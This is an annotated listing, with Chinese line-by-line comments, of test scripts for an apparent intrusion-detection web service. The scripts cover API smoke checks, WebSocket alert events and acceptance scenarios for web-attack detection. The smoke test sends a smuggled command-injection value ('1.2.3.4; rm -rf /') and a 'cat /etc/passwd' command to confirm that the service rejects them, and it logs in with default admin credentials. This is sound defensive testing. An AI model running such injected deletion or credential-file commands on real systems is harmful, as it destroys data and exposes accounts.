| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "DATABASE_URL": f"sqlite:///{(SMOKE_DIR / 'phase7_smoke.db').as_posix()}",` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "AUDIT_INTEGRITY_PATROL": "false",` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ALERT_STREAM_CONSUMER_AUTOSTART": "false",` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "REDIS_HOST": "127.0.0.1",` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "REDIS_PORT": "63999",` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 31 | 函数调用：执行已有函数/方法完成当前步骤。 | `os.environ.pop("ADMIN_PASSWORD_HASH", None)` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 函数调用：执行已有函数/方法完成当前步骤。 | `sys.path.insert(0, str(ROOT))` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 导入对象：从指定模块引入类、函数或常量。 | `from web.app import create_app  # noqa: E402` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 函数定义：声明 `show` 的输入、处理逻辑和返回结果。 | `def show(tag: str, resp) -> None:` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    body = resp.get_data(as_text=True)` |
| 40 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body = json.dumps(json.loads(body), ensure_ascii=False)` |
| 42 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:` |
| 43 | 占位语句：保持语法完整但当前不执行操作。 | `        pass` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(f"[{tag}] {resp.status_code} {body[:220]}")` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> None:` |
| 48 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("health", client.get("/api/health"))` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("stats-no-jwt", client.get("/api/stats"))` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show(` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "login-bad",` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        client.post("/api/auth/login", json={"username": "x", "password": "y"}),` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resp = client.post(` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "/api/auth/login", json={"username": "admin", "password": "changeme"}` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("login-ok", resp)` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    token = resp.get_json().get("access_token")` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    hdr = {"Authorization": f"Bearer {token}"}` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("stats-jwt", client.get("/api/stats", headers=hdr))` |
| 66 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("me", client.get("/api/auth/me", headers=hdr))` |
| 67 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show(` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ban-bad",` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `        client.post(` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "/api/banned_ips", headers=hdr, json={"ip": "1.2.3.4; rm -rf /"}` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 72 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 73 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show(` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ban-ok",` |
| 75 | 函数调用：执行已有函数/方法完成当前步骤。 | `        client.post(` |
| 76 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "/api/banned_ips",` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            headers=hdr,` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            json={"ip": "1.2.3.4", "reason": "test"},` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 81 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("ban-list", client.get("/api/banned_ips", headers=hdr))` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show(` |
| 83 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "cmd-status",` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        client.post("/api/command", headers=hdr, json={"command": "status"}),` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show(` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "cmd-block",` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        client.post("/api/command", headers=hdr, json={"command": "block 8.8.8.8"}),` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show(` |
| 91 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "cmd-bad",` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `        client.post(` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "/api/command", headers=hdr, json={"command": "cat /etc/passwd"}` |
| 94 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 95 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("dashboard-html", client.get("/dashboard"))` |
| 97 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("login-html", client.get("/login"))` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("css-theme", client.get("/static/css/theme.css"))` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `    show("js-utils", client.get("/static/js/utils.js"))` |
| 100 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `    main()` |

## `tests/_verify_ws_events.py`

- 类型：测试
- 行数：99

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Phase 7 P2 尾声：验证 WebSocket 事件名已统一为 \`alert\`。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `手测脚本（不纳入 pytest）。依赖正在运行的 Flask 服务 + python-socketio 客户端。` |
| 4 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 5 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import requests` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import socketio` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `BASE = "http://127.0.0.1:5000"` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 函数定义：声明 `login` 的输入、处理逻辑和返回结果。 | `def login() -> str:` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resp = requests.post(` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `        f"{BASE}/api/auth/login",` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={"username": "admin", "password": "changeme"},` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        timeout=5,` |
| 21 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `    resp.raise_for_status()` |
| 23 | 返回结果：把处理后的值交回调用方。 | `    return resp.json()["access_token"]` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    token = login()` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    counters = {"alert": 0, "new_alert": 0, "threat_detected": 0, "alert_updated": 0}` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = socketio.Client(reconnection=False)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 装饰器：为下面的函数或类附加框架行为。 | `    @client.on("alert")` |
| 33 | 函数定义：声明 `_on_alert` 的输入、处理逻辑和返回结果。 | `    def _on_alert(data):  # type: ignore[unused-function]` |
| 34 | 代码语句：参与当前文件的业务流程或数据处理。 | `        counters["alert"] += 1` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 装饰器：为下面的函数或类附加框架行为。 | `    @client.on("new_alert")` |
| 37 | 函数定义：声明 `_on_new_alert` 的输入、处理逻辑和返回结果。 | `    def _on_new_alert(data):  # type: ignore[unused-function]` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `        counters["new_alert"] += 1` |
| 39 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 40 | 装饰器：为下面的函数或类附加框架行为。 | `    @client.on("threat_detected")` |
| 41 | 函数定义：声明 `_on_td` 的输入、处理逻辑和返回结果。 | `    def _on_td(data):  # type: ignore[unused-function]` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `        counters["threat_detected"] += 1` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 装饰器：为下面的函数或类附加框架行为。 | `    @client.on("alert_updated")` |
| 45 | 函数定义：声明 `_on_updated` 的输入、处理逻辑和返回结果。 | `    def _on_updated(data):  # type: ignore[unused-function]` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `        counters["alert_updated"] += 1` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 注释：解释下面或当前这段代码的设计意图。 | `    # 优先 websocket；如果 websocket-client 未装，退回 polling` |
| 49 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `        client.connect(BASE, transports=["websocket"])` |
| 51 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `        client.connect(BASE, transports=["polling"])` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `    time.sleep(0.5)` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 注释：解释下面或当前这段代码的设计意图。 | `    # 触发 8 条演示告警 → 应产生 8 次 \`alert\` 事件，0 次其它` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resp = requests.post(` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `        f"{BASE}/api/alerts/_seed",` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        headers={"Authorization": f"Bearer {token}"},` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={"count": 8},` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        timeout=10,` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 62 | 函数调用：执行已有函数/方法完成当前步骤。 | `    resp.raise_for_status()` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created = resp.json().get("created", 0)` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 注释：解释下面或当前这段代码的设计意图。 | `    # 拿第一条 id 做一次状态变更 → 应产生 1 次 \`alert_updated\`` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    items = requests.get(` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `        f"{BASE}/api/alerts?limit=1",` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        headers={"Authorization": f"Bearer {token}"},` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        timeout=5,` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ).json()` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    first_id = items[0]["id"] if items else None` |
| 72 | 条件判断：满足条件时进入对应分支。 | `    if first_id:` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        resp = requests.post(` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `            f"{BASE}/api/alerts/{first_id}/status",` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            headers={"Authorization": f"Bearer {token}"},` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            json={"status": "acknowledged"},` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            timeout=5,` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `        resp.raise_for_status()` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 注释：解释下面或当前这段代码的设计意图。 | `    # 等事件到齐（SocketIO 是异步派发）` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `    time.sleep(1.5)` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `    client.disconnect()` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print(f"seeded: {created} alerts")` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print(f"counters: {counters}")` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok = (` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        counters["alert"] == created` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `        and counters["new_alert"] == 0` |
| 91 | 代码语句：参与当前文件的业务流程或数据处理。 | `        and counters["threat_detected"] == 0` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `        and counters["alert_updated"] >= (1 if first_id else 0)` |
| 93 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("PASS" if ok else "FAIL")` |
| 95 | 返回结果：把处理后的值交回调用方。 | `    return 0 if ok else 1` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.exit(main())` |

## `tests/conftest.py`

- 类型：测试
- 行数：11

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 函数定义：声明 `pytest_configure` 的输入、处理逻辑和返回结果。 | `def pytest_configure(config):` |
| 7 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("FLASK_ENV", "testing")` |
| 8 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("ALERT_STREAM_CONSUMER_AUTOSTART", "false")` |
| 9 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("AUDIT_INTEGRITY_PATROL", "false")` |
| 10 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("REDIS_HOST", "127.0.0.1")` |
| 11 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("REDIS_PORT", "63999")` |

## `tests/e2e/__init__.py`

- 类型：测试
- 行数：1

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""v1.0 端到端与验收测试包。"""` |

## `tests/e2e/test_v1_acceptance.py`

- 类型：测试
- 行数：60

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""pytest 版 v1.0 验收场景（与 scripts/verify_v1.py 共享逻辑）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `pytestmark = pytest.mark.e2e` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from tests.e2e.verify_scenarios import (` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_01_normal_web_no_alert,` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_02_sqli_web_attack_high,` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_03_double_encoded_xss_high,` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_04_cmd_injection_high,` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_05_ioc_threat_intel_high,` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_06_syn_surge_anomaly_or_ddos,` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_07_model_missing_other_engines_continue,` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_08_redis_downgrade_memory_mode,` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_09_audit_tamper_fails_integrity,` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    check_10_web_restart_alerts_queryable,` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数定义：声明 `test_01_normal_web` 的输入、处理逻辑和返回结果。 | `def test_01_normal_web():` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_01_normal_web_no_alert()` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 函数定义：声明 `test_02_sqli` 的输入、处理逻辑和返回结果。 | `def test_02_sqli():` |
| 27 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_02_sqli_web_attack_high()` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 函数定义：声明 `test_03_double_xss` 的输入、处理逻辑和返回结果。 | `def test_03_double_xss():` |
| 31 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_03_double_encoded_xss_high()` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 函数定义：声明 `test_04_cmd_injection` 的输入、处理逻辑和返回结果。 | `def test_04_cmd_injection():` |
| 35 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_04_cmd_injection_high()` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 函数定义：声明 `test_05_ioc_local_blacklist` 的输入、处理逻辑和返回结果。 | `def test_05_ioc_local_blacklist():` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_05_ioc_threat_intel_high()` |
| 40 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `test_06_syn_or_anomaly` 的输入、处理逻辑和返回结果。 | `def test_06_syn_or_anomaly():` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_06_syn_surge_anomaly_or_ddos()` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 函数定义：声明 `test_07_model_degrade` 的输入、处理逻辑和返回结果。 | `def test_07_model_degrade(tmp_path):` |
| 47 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_07_model_missing_other_engines_continue(tmp_path)` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 函数定义：声明 `test_08_redis_memory_fallback` 的输入、处理逻辑和返回结果。 | `def test_08_redis_memory_fallback():` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_08_redis_downgrade_memory_mode()` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 函数定义：声明 `test_09_audit_tamper` 的输入、处理逻辑和返回结果。 | `def test_09_audit_tamper(tmp_path):` |
| 55 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_09_audit_tamper_fails_integrity(tmp_path)` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `test_10_web_restart_alerts` 的输入、处理逻辑和返回结果。 | `def test_10_web_restart_alerts(monkeypatch, tmp_path):` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ALERT_STREAM_CONSUMER_AUTOSTART", "false")` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `    check_10_web_restart_alerts_queryable(monkeypatch, tmp_path)` |

## `tests/e2e/verify_scenarios.py`

- 类型：测试
- 行数：341

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `v1.0 端到端验收场景（与 docs/AI安全守卫-v1.0-交付验收与路线图.md §8 对齐）。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `实现说明：` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `- Web 攻击类场景在进程内调用 WebAttackDetector / WebFeatureExtractor，与 main.py` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `  process_web_log → detect 路径一致。` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `- IOC 使用 ThreatIntelCollector 内存黑名单（等价于「本地黑名单 IP」）。` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `- 流量异常：优先使用已加载的异常检测模型；若无模型，则用与 test_detectors 一致的` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `  合成特征 + 伪装模型验证「SYN 突增类」流特征可升为 anomaly high（替代验证）。` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `- Redis：连接非法端口验证降级为 memory 模式（等价于停止 Redis 后的客户端行为）。` |
| 11 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 12 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import shutil` |
| 17 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 18 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Callable, List, Tuple` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 注释：解释下面或当前这段代码的设计意图。 | `# 项目根目录` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_PROJECT_ROOT = Path(__file__).resolve().parents[2]` |
| 25 | 条件判断：满足条件时进入对应分支。 | `if str(_PROJECT_ROOT) not in sys.path:` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, str(_PROJECT_ROOT))` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `from src.audit.security_logger import SecurityLogger  # noqa: E402` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.anomaly_detector import AnomalyDetector  # noqa: E402` |
| 30 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.ddos_detector import DDoSDetector  # noqa: E402` |
| 31 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.web_detector import WebAttackDetector  # noqa: E402` |
| 32 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.threat_intel import ThreatIntelCollector  # noqa: E402` |
| 33 | 导入对象：从指定模块引入类、函数或常量。 | `from src.features.web_features import WebFeatureExtractor  # noqa: E402` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `from src.registry.model_registry import ModelRegistry  # noqa: E402` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 函数定义：声明 `_release_security_logger_handlers` 的输入、处理逻辑和返回结果。 | `def _release_security_logger_handlers(sl: SecurityLogger) -> None:` |
| 38 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Windows 下 tempfile 删除目录前须关闭 FileHandler，否则会 PermissionError。"""` |
| 39 | 循环：逐个处理集合或迭代器中的元素。 | `    for h in list(sl.logger.handlers):` |
| 40 | 日志记录：输出运行状态、调试信息或异常线索。 | `        sl.logger.removeHandler(h)` |
| 41 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 42 | 函数调用：执行已有函数/方法完成当前步骤。 | `            h.close()` |
| 43 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:` |
| 44 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
